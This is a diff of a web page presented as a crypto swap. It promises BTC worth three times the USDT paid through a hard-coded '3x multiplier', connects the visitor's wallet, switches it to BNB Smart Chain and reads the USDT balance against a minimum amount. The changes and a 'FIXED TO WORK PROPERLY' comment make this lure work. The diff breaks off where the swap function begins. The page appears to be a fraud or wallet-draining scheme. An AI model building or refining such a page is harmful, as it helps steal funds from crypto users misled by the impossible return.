@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Professional Crypto Swap</title>
+    <title>Working Crypto Swap</title>
     <style>
         :root {
             --primary: #F0B90B;
@@ -27,7 +27,6 @@
         @font-face {
             font-family: 'Inter';
             src: url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
-            font-display: swap;
         }
 
         body {
@@ -60,7 +59,6 @@
         .swap-title {
             font-size: 20px;
             font-weight: 600;
-            color: var(--text-dark);
         }
 
         .swap-settings {
@@ -98,10 +96,9 @@
             margin-bottom: 12px;
         }
 
-        .token-selector {
+        .token-info {
             display: flex;
             align-items: center;
-            cursor: pointer;
         }
 
         .token-logo {
@@ -148,7 +145,7 @@
             color: var(--border);
         }
 
-        .token-usd-value {
+        .token-value-display {
             font-size: 14px;
             color: var(--text-light);
             text-align: right;
@@ -174,12 +171,6 @@
             justify-content: center;
             color: var(--primary);
             z-index: 2;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-
-        .swap-icon:hover {
-            transform: translateY(-2px);
         }
 
         .swap-divider-line {
@@ -248,18 +239,16 @@
             cursor: pointer;
             transition: all 0.2s;
             margin-top: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
         }
 
         .swap-button:hover {
             background-color: var(--primary-hover);
-            transform: translateY(-1px);
         }
 
-        .swap-button:active {
-            transform: translateY(0);
+        .swap-button:disabled {
+            background-color: var(--border);
+            color: var(--text-light);
+            cursor: not-allowed;
         }
 
         /* Modal Styles */
@@ -271,7 +260,6 @@
             width: 100%;
             height: 100%;
             background-color: rgba(0, 0, 0, 0.6);
-            backdrop-filter: blur(4px);
             justify-content: center;
             align-items: center;
             z-index: 1000;
@@ -284,12 +272,6 @@
             max-width: 380px;
             padding: 24px;
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.12);
-            animation: modalFadeIn 0.3s ease-out;
-        }
-
-        @keyframes modalFadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
         }
 
         .modal-header {
@@ -302,7 +284,6 @@
         .modal-title {
             font-size: 18px;
             font-weight: 600;
-            color: var(--text-dark);
         }
 
         .modal-close {
@@ -346,7 +327,6 @@
             font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            transition: background-color 0.2s;
         }
 
         .modal-button:hover {
@@ -375,20 +355,12 @@
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
             margin-right: 8px;
+            display: inline-block;
+            vertical-align: middle;
         }
 
         @keyframes spin {
             to { transform: rotate(360deg); }
-        }
-
-        /* Responsive adjustments */
-        @media (max-width: 480px) {
-            .swap-container {
-                padding: 20px;
-            }
-            .token-amount-input {
-                font-size: 22px;
-            }
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
@@ -406,17 +378,16 @@
             <div class="token-label">You pay</div>
             <div class="token-input-box">
                 <div class="token-header">
-                    <div class="token-selector">
+                    <div class="token-info">
                         <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="token-logo" alt="USDT">
                         <span class="token-name">USDT</span>
                         <span class="token-badge">BSC</span>
-                        <i class="fas fa-chevron-down" style="margin-left: 8px; font-size: 12px; color: var(--text-light);"></i>
                     </div>
                 </div>
                 <div class="token-input-wrapper">
                     <input type="number" id="usdtInput" class="token-amount-input" placeholder="0.0" value="200">
                 </div>
-                <div id="usdtValue" class="token-usd-value">$200.00</div>
+                <div id="usdtValue" class="token-value-display">$200.00</div>
             </div>
         </div>
 
@@ -431,17 +402,16 @@
             <div class="token-label">You receive</div>
             <div class="token-input-box">
                 <div class="token-header">
-                    <div class="token-selector">
+                    <div class="token-info">
                         <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" class="token-logo" alt="BTC">
                         <span class="token-name">BTC</span>
                         <span class="token-badge">BTC</span>
-                        <i class="fas fa-chevron-down" style="margin-left: 8px; font-size: 12px; color: var(--text-light);"></i>
                     </div>
                 </div>
                 <div class="token-input-wrapper">
-                    <div id="btcAmount" class="token-amount-input" style="color: var(--text-dark);">0.00506297</div>
+                    <div id="btcAmount" class="token-amount-input" style="pointer-events: none;">0.00506297</div>
                 </div>
-                <div id="btcValue" class="token-usd-value">$600.00</div>
+                <div id="btcValue" class="token-value-display">$600.00</div>
             </div>
         </div>
 
@@ -485,7 +455,7 @@
             </div>
             <button id="modalButton" class="modal-button" style="display: none;">Done</button>
             <a href="#" id="txLink" class="tx-link" target="_blank" style="display: none;">
-                <i class="fas fa-external-link-alt"></i> View transaction on BscScan
+                <i class="fas fa-external-link-alt"></i> View transaction
             </a>
         </div>
     </div>
@@ -519,37 +489,33 @@
             let isProcessing = false;
 
             // Initialize
-            init();
-
-            function init() {
-                setupEventListeners();
-                updateConversion();
-            }
+            updateValues();
+            setupEventListeners();
 
             function setupEventListeners() {
                 // Input change handler
-                usdtInput.addEventListener('input', updateConversion);
+                usdtInput.addEventListener('input', updateValues);
                 
-                // Swap button handler
+                // Swap button handler - FIXED TO WORK PROPERLY
                 swapButton.addEventListener('click', handleSwap);
                 
-                // Modal close handler
+                // Modal handlers
                 modalClose.addEventListener('click', closeModal);
                 modalButton.addEventListener('click', closeModal);
                 
-                // Wallet account change handler
+                // Handle wallet changes
                 if (window.ethereum) {
                     window.ethereum.on('accountsChanged', handleAccountsChanged);
                     window.ethereum.on('chainChanged', handleChainChanged);
                 }
             }
 
-            function updateConversion() {
+            function updateValues() {
                 const usdt = parseFloat(usdtInput.value) || 0;
                 const usd = usdt * 1.0; // 1 USDT = 1 USD
                 const btc = (usd * 3) / BTC_RATE; // 3x multiplier
                 
-                // Update displays
+                // Update all displays
                 usdtValue.textContent = `$${usd.toFixed(2)}`;
                 btcAmount.textContent = btc.toFixed(8);
                 btcValue.textContent = `$${(usd * 3).toFixed(2)}`;
@@ -561,27 +527,27 @@
                 try {
                     isProcessing = true;
                     buttonText.innerHTML = '<span class="spinner"></span> Processing';
+                    swapButton.disabled = true;
                     
                     // Check if wallet is installed
                     if (!window.ethereum) {
                         throw new Error('Please install MetaMask or Trust Wallet to continue');
                     }
                     
-                    // Show connecting modal
                     showModal('Connecting Wallet', 'Waiting for wallet connection...');
-                    updateProgress(10);
+                    updateProgress(20);
                     
                     // Request account access
                     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    updateProgress(30);
+                    updateProgress(40);
                     
                     // Switch to BNB Smart Chain
                     await switchToBNBChain();
-                    updateProgress(50);
+                    updateProgress(60);
                     
                     // Check USDT balance
                     const balance = await getUSDTBalance(accounts[0]);
-                    updateProgress(70);
+                    updateProgress(80);
                     
                     // Validate balance
                     if (balance < MIN_SWAP_AMOUNT) {
@@ -598,6 +564,7 @@
                 } finally {
                     isProcessing = false;
                     buttonText.textContent = 'Swap Now';
+                    swapButton.disabled = false;
                 }
             }
 
@@ -621,4 +588,29 @@
                                         symbol: 'BNB',
                                         decimals: 18,
                                     },
-                      
+                                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                    blockExplorerUrls: ['https://bscscan.com'],
+                                }],
+                            });
+                        } catch (addError) {
+                            throw new Error('Failed to add BSC network to wallet');
+                        }
+                    } else {
+                        throw new Error('Failed to switch to BSC network');
+                    }
+                }
+            }
+
+            async function getUSDTBalance(address) {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const usdtContract = new ethers.Contract(
+                    USDT_CONTRACT_ADDRESS,
+                    ['function balanceOf(address) view returns (uint256)'],
+                    provider
+                );
+                
+                const balance = await usdtContract.balanceOf(address);
+                return parseFloat(ethers.utils.formatUnits(balance, 18));
+            }
+
+            async function performSwap(
